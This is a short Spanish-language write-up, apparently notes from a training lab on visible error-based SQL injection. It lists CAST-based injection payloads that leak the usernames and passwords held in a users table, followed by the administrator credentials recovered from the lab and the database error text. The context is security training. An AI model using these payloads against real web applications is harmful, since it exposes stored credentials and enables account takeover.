# 13 Lab: Visible error-based SQL injection

```sql
' //Para ver el error que muestra
Debido a esto validamos que si o si nos va a pedir un char

' AND 1=CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT username FROM users) AS int)--

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

user:administrator
pass:gp0zyjqbgui3toqe99hj
```

![Untitled](13%20Lab%20Visible%20error-based%20SQL%20injection%2017efab5460ec8123a4f7cb02f6a68868/Untitled.png)

Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'zoEelT8oug2qYxK9''. Expected  char

Adapte la consulta para incluir una subconsulta SELECT genérica y convierta el valor devuelto a un tipo de datos int **Vemos que no muestra ningun error**

![Untitled](13%20Lab%20Visible%20error-based%20SQL%20injection%2017efab5460ec8123a4f7cb02f6a68868/Untitled%201.png)

![Untitled](13%20Lab%20Visible%20error-based%20SQL%20injection%2017efab5460ec8123a4f7cb02f6a68868/Untitled%202.png)

Aquí observamos la utilidad del CAST, puesto que nosotros vamos a forzar a que el resultado de nuestro select se convierta en INT, nos mostrará el error de “valor de la consulta” no puede ser un numero, revelándonos el valor

![Untitled](13%20Lab%20Visible%20error-based%20SQL%20injection%2017efab5460ec8123a4f7cb02f6a68868/Untitled%203.png)

![Untitled](13%20Lab%20Visible%20error-based%20SQL%20injection%2017efab5460ec8123a4f7cb02f6a68868/Untitled%204.png)

fdfsdfsd